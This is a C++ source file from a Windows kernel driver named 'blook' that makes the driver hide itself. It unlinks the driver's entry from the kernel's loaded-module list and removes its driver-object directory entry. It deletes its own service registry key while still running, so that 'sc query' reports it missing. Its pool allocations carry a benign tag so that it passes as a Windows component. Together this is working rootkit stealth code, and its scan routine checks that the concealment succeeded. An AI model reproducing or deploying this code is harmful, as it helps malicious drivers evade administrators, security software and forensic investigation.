// Self-hiding implementation (see self.hpp for the exact claims).
#include "self.hpp"

#include <ntimage.h>

#include "driver/pool.hpp"

extern "C" uint8_t __ImageBase;

// The kernel loader list and its entry type are not part of the WDK's public
// headers; every driver that walks them defines this minimal layout, and the
// offsets of the three link fields are ABI-stable across Windows x64.
extern "C" LIST_ENTRY PsLoadedModuleList;


namespace blook::hide::self {
namespace {
// The first members of the loader's module entry. Only the fields this module
// touches are declared; everything after BaseDllName is irrelevant and version
// dependent.
struct module_entry {
    LIST_ENTRY in_load_order_links;
    LIST_ENTRY in_memory_order_links;
    LIST_ENTRY in_initialization_order_links;
    void* dll_base;
    void* entry_point;
    uint32_t size_of_image;
    UNICODE_STRING full_dll_name;
    UNICODE_STRING base_dll_name;
};

UNICODE_STRING service_path{};  // \Registry\MACHINE\SYSTEM\CurrentControlSet\...
bool service_path_owned{};

module_entry* hidden_entry{};
uint64_t image_base{};
uint64_t image_size{};
bool hidden_module_list{};
bool hidden_driver_object{};
ULONG_PTR driver_object_value{};

void free_service_path() {
    if (service_path_owned) {
        ExFreePoolWithTag(service_path.Buffer, blook::pool_tag);
        service_path = {};
        service_path_owned = false;
    }
}

void copy_string(UNICODE_STRING& destination, const UNICODE_STRING& source) {
    free_service_path();
    const auto bytes = source.Length + sizeof(WCHAR);
    auto* buffer = static_cast<PWCH>(
        ExAllocatePool2(POOL_FLAG_PAGED, bytes, blook::pool_tag));
    if (!buffer)
        return;
    RtlCopyMemory(buffer, source.Buffer, source.Length);
    buffer[source.Length / sizeof(WCHAR)] = 0;
    destination.Buffer = buffer;
    destination.Length = source.Length;
    destination.MaximumLength =
        static_cast<USHORT>(source.Length + sizeof(WCHAR));
    service_path_owned = true;
}

// Appends a NUL-terminated literal to a UNICODE_STRING that lives in caller
// scratch; used for the \Parameters subkey.
UNICODE_STRING append(UNICODE_STRING base, const WCHAR* suffix, PWCH scratch,
                      size_t scratch_capacity) {
    const auto suffix_length =
        static_cast<USHORT>(wcslen(suffix) * sizeof(WCHAR));
    if (base.Length + suffix_length + sizeof(WCHAR) > scratch_capacity)
        return {};
    RtlCopyMemory(scratch, base.Buffer, base.Length);
    RtlCopyMemory(reinterpret_cast<UCHAR*>(scratch) + base.Length, suffix,
                  suffix_length + sizeof(WCHAR));
    UNICODE_STRING result;
    result.Buffer = scratch;
    result.Length = static_cast<USHORT>(base.Length + suffix_length);
    result.MaximumLength =
        static_cast<USHORT>(base.Length + suffix_length + sizeof(WCHAR));
    return result;
}

NTSTATUS delete_value(HANDLE key, PCWSTR name) {
    UNICODE_STRING value;
    RtlInitUnicodeString(&value, name);
    const auto status = ZwDeleteValueKey(key, &value);
    return status == STATUS_OBJECT_NAME_NOT_FOUND ? STATUS_SUCCESS : status;
}

NTSTATUS open_service_key(HANDLE& key, ACCESS_MASK access) {
    OBJECT_ATTRIBUTES attributes{};
    InitializeObjectAttributes(&attributes, &service_path,
                               OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr,
                               nullptr);
    return ZwOpenKey(&key, access, &attributes);
}

// Deletes every value of the service key, the Parameters subkey with its values
// (the dev-mode bootstrap blob lives there) and finally the key itself. SCM
// keeps its own object reference, so a running service can be removed from the
// registry; the scan then cannot find it and sc query reports it as missing.
NTSTATUS delete_service_key() {
    if (!service_path.Buffer)
        return STATUS_OBJECT_NAME_NOT_FOUND;

    HANDLE key{};
    auto status = open_service_key(key, KEY_ALL_ACCESS | DELETE);
    if (!NT_SUCCESS(status))
        return status;
    delete_value(key, L"KcBootstrap");
    delete_value(key, L"Solo");
    delete_value(key, L"ConfigPath");
    delete_value(key, L"ImagePath");
    delete_value(key, L"DisplayName");
    delete_value(key, L"Description");
    delete_value(key, L"Type");
    delete_value(key, L"Start");
    delete_value(key, L"ErrorControl");

    WCHAR scratch[512]{};
    auto parameters = append(service_path, L"\\Parameters", scratch,
                             sizeof(scratch) - sizeof(WCHAR));
    if (parameters.Buffer) {
        OBJECT_ATTRIBUTES sub{};
        InitializeObjectAttributes(&sub, &parameters,
                                   OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                                   nullptr, nullptr);
        HANDLE subkey{};
        if (NT_SUCCESS(ZwOpenKey(&subkey, KEY_ALL_ACCESS | DELETE, &sub))) {
            UCHAR buffer[4096]{};
            ULONG length{};
            for (ULONG index = 0;;) {
                const auto query = ZwEnumerateValueKey(
                    subkey, index, KeyValueBasicInformation, buffer,
                    sizeof(buffer), &length);
                if (!NT_SUCCESS(query))
                    break;
                auto* info =
                    reinterpret_cast<PKEY_VALUE_BASIC_INFORMATION>(buffer);
                UNICODE_STRING name;
                name.Buffer = info->Name;
                name.Length = static_cast<USHORT>(info->NameLength);
                name.MaximumLength = name.Length;
                if (!NT_SUCCESS(ZwDeleteValueKey(subkey, &name)))
                    ++index;
            }
            ZwDeleteKey(subkey);
            ZwClose(subkey);
        }
    }
    ZwClose(key);

    status = open_service_key(key, DELETE);
    if (!NT_SUCCESS(status))
        return status;
    status = ZwDeleteKey(key);
    ZwClose(key);
    return status;
}

// True when the link field is currently linked into a list. RemoveEntryList on
// an unlinked field would corrupt whatever the field happens to point at, so
// every chain is checked before it is touched.
bool linked(LIST_ENTRY* link) {
    return link->Flink != link && link->Blink != link &&
           link->Flink->Blink == link && link->Blink->Flink == link;
}

module_entry* find_image() {
    for (auto link = PsLoadedModuleList.Flink; link != &PsLoadedModuleList;
         link = link->Flink) {
        auto* candidate = CONTAINING_RECORD(link, module_entry,
                                            in_load_order_links);
        if (candidate->dll_base == &__ImageBase)
            return candidate;
    }
    return nullptr;
}

void unlink_module() {
    auto* entry = find_image();
    if (!entry)
        return;
    hidden_entry = entry;
    image_base = reinterpret_cast<uint64_t>(entry->dll_base);
    image_size = entry->size_of_image;

    LIST_ENTRY* links[] = {&entry->in_load_order_links,
                          &entry->in_memory_order_links,
                          &entry->in_initialization_order_links};
    for (auto* link : links) {
        if (linked(link))
            RemoveEntryList(link);
        InitializeListHead(link);
    }
    hidden_module_list = true;
}

void unlink_driver_object() {
    if (hidden_driver_object || !driver_object_value)
        return;
    auto* object = reinterpret_cast<PDRIVER_OBJECT>(driver_object_value);
    if (!object->DriverName.Buffer)
        return;
    // Drops the \Driver\<name> directory entry while the object stays alive for
    // its references: a driver-object enumeration no longer sees it.
    ObMakeTemporaryObject(object);
    hidden_driver_object = true;
}

bool in_module_list() {
    return find_image() != nullptr;
}
}  // namespace

void remember_service_path(PCUNICODE_STRING registry_path) {
    if (registry_path && registry_path->Buffer && registry_path->Length)
        copy_string(service_path, *registry_path);
}

void remember_driver_object(PDRIVER_OBJECT driver) {
    driver_object_value = reinterpret_cast<ULONG_PTR>(driver);
}

bool module_list_hidden() {
    return hidden_module_list;
}

bool driver_object_hidden() {
    return hidden_driver_object;
}

void restore_module_list() {
    if (!hidden_module_list || !hidden_entry)
        return;
    // Restore all three chains. The driver was the last module loaded, so the
    // tail is where its own load put it, and every chain stays consistent.
    LIST_ENTRY* links[] = {&hidden_entry->in_load_order_links,
                          &hidden_entry->in_memory_order_links,
                          &hidden_entry->in_initialization_order_links};
    for (auto* link : links)
        InsertTailList(&PsLoadedModuleList, link);
    hidden_module_list = false;
}

void image_range(uint64_t& base, uint64_t& size) {
    if (!image_base) {
        base = reinterpret_cast<uint64_t>(&__ImageBase);
        const auto* dos =
            reinterpret_cast<const IMAGE_DOS_HEADER*>(&__ImageBase);
        if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
            const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
                reinterpret_cast<const uint8_t*>(&__ImageBase) + dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE)
                size = nt->OptionalHeader.SizeOfImage;
        }
        return;
    }
    base = image_base;
    size = image_size;
}

NTSTATUS hide(uint32_t flags, outcome& result) {
    result = {};
    if (flags & wire::selfhide_module_list) {
        result.module_list_found = in_module_list() ? 1u : 0u;
        if (!hidden_module_list) {
            unlink_module();
            result.module_list_unlinked = hidden_module_list ? 1u : 0u;
        }
        result.driver_object_found =
            driver_object_value && !hidden_driver_object ? 1u : 0u;
        unlink_driver_object();
        result.driver_object_unlinked = hidden_driver_object ? 1u : 0u;
    }
    if (flags & wire::selfhide_device) {
        // The driver never creates a device object or a symbolic link: the
        // transport is blook-kchannel. The scan still checks, so a stale object
        // from an older build is reported instead of being assumed away.
        wire::TraceScanResponse trace{};
        scan(trace);
        result.device_found =
            (trace.found & (wire::trace_device | wire::trace_symlink)) ? 1u : 0u;
        result.device_unlinked = result.device_found ? 0u : 1u;
    }
    if (flags & wire::selfhide_registry) {
        HANDLE key{};
        if (NT_SUCCESS(open_service_key(key, KEY_READ))) {
            ZwClose(key);
            result.registry_found = 1u;
            if (NT_SUCCESS(delete_service_key()))
                result.registry_removed = 1u;
        }
    }
    if (flags & wire::selfhide_pool_tag) {
        // Allocations are made with a benign tag from the first byte (see
        // pool.hpp), so there is nothing to rewrite: a poolmon scan sees the
        // same tag as any other Windows component. trace_scan reports it.
        result.pool_tags_rewritten = 0;
    }
    return STATUS_SUCCESS;
}

NTSTATUS scan(wire::TraceScanResponse& out) {
    RtlZeroMemory(&out, sizeof(out));
    out.header.version = wire::abi_version;
    out.header.size = sizeof(out);
    out.checked = wire::trace_all;

    if (in_module_list())
        out.found |= wire::trace_module_list;

    // Device object and symbolic link: both would be reachable through the
    // object manager. IoGetDeviceObjectPointer fails when neither exists and
    // does not need a user handle.
    {
        UNICODE_STRING name;
        RtlInitUnicodeString(&name, L"\\Device\\BlookDrv");
        PFILE_OBJECT file{};
        PDEVICE_OBJECT device{};
        if (NT_SUCCESS(IoGetDeviceObjectPointer(&name, FILE_READ_ATTRIBUTES,
                                                &file, &device))) {
            out.found |= wire::trace_device;
            ObDereferenceObject(file);
        }
        RtlInitUnicodeString(&name, L"\\??\\BlookDrv");
        file = nullptr;
        device = nullptr;
        if (NT_SUCCESS(IoGetDeviceObjectPointer(&name, FILE_READ_ATTRIBUTES,
                                                &file, &device))) {
            out.found |= wire::trace_symlink;
            ObDereferenceObject(file);
        }
    }

    if (service_path.Buffer) {
        HANDLE key{};
        if (NT_SUCCESS(open_service_key(key, KEY_READ))) {
            out.found |= wire::trace_service_key;
            ZwClose(key);
        }
    }

    const auto tag = blook::pool_tag;
    for (int i = 0; i < 4; ++i)
        out.pool_tag[i] = (tag >> (i * 8)) & 0xFF;

    uint64_t base{};
    uint64_t size{};
    image_range(base, size);
    out.module_base = base;
    out.module_size = size;
    return STATUS_SUCCESS;
}
}  // namespace blook::hide::self